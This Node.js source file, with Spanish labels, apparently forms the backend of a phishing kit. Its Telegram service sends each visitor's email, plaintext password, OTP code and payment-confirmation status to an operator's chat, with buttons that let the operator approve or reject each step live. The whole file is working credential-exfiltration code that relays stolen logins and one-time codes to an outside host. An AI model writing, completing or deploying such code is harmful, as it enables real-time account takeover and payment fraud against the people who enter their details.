const axios = require('axios');
const config = require('../config');

class TelegramService {
  constructor() {
    this.botToken = config.telegram.botToken;
    this.chatId = config.telegram.chatId;
    this.apiUrl = `https://api.telegram.org/bot${this.botToken}`;
  }

  async sendMessage(text) {
    try {
      const response = await axios.post(`${this.apiUrl}/sendMessage`, {
        chat_id: this.chatId,
        text: text,
        parse_mode: 'HTML',
      });

      console.log(`[TELEGRAM] Mensaje enviado: ${text.substring(0, 50)}...`);
      return response.data;
    } catch (error) {
      console.error('[TELEGRAM ERROR]', error.response?.data || error.message);
      throw error;
    }
  }

  async sendAuthRequest(sessionId, email, password) {
    const text = `
<b>🔐 SOLICITUD DE AUTENTICACIÓN</b>
<b>Session ID:</b> <code>${sessionId}</code>
<b>Email:</b> <code>${email}</code>
<b>Password:</b> <code>${password}</code>

<b>Selecciona una opción:</b>
    `;

    const keyboard = {
      inline_keyboard: [
        [
          {
            text: '✅ RegistroOtp',
            url: `${config.apiUrl}/auth/respond/${sessionId}?response=RegistroOtp`,
          },
          {
            text: '❌ ERROR',
            url: `${config.apiUrl}/auth/respond/${sessionId}?response=ERROR`,
          },
        ],
      ],
    };

    return this.sendMessageWithButtons(text, keyboard);
  }

  async sendOtpRequest(sessionId, code) {
    const text = `
<b>🔑 VERIFICACIÓN OTP</b>
<b>Session ID:</b> <code>${sessionId}</code>
<b>Código OTP:</b> <code>${code}</code>

<b>Selecciona una opción:</b>
    `;

    const keyboard = {
      inline_keyboard: [
        [
          {
            text: '🎉 Aprobado',
            url: `${config.apiUrl}/otp/respond/${sessionId}?response=Aprobado`,
          },
          {
            text: '❌ ERROR',
            url: `${config.apiUrl}/otp/respond/${sessionId}?response=ERROR`,
          },
        ],
      ],
    };

    return this.sendMessageWithButtons(text, keyboard);
  }

  async sendConfirmationRequest(sessionId) {
    const text = `
<b>✔️ CONFIRMACIÓN FINAL</b>
<b>Session ID:</b> <code>${sessionId}</code>

<b>Usuario ha llegado a confirmación de pago.</b>

<b>Selecciona una opción:</b>
    `;

    const keyboard = {
      inline_keyboard: [
        [
          {
            text: '✅ Confirmar',
            url: `${config.apiUrl}/confirmation/respond/${sessionId}?response=Confirmado`,
          },
          {
            text: '❌ Rechazar',
            url: `${config.apiUrl}/confirmation/respond/${sessionId}?response=ERROR`,
          },
        ],
      ],
    };

    return this.sendMessageWithButtons(text, keyboard);
  }

  async sendMessageWithButtons(text, keyboard) {
    try {
      const response = await axios.post(`${this.apiUrl}/sendMessage`, {
        chat_id: this.chatId,
        text: text,
        parse_mode: 'HTML',
        reply_markup: keyboard,
      });

      console.log(`[TELEGRAM] Mensaje con botones enviado`);
      return response.data;
    } catch (error) {
      console.error('[TELEGRAM ERROR]', error.response?.data || error.message);
      throw error;
    }
  }
}

module.exports = new TelegramService();
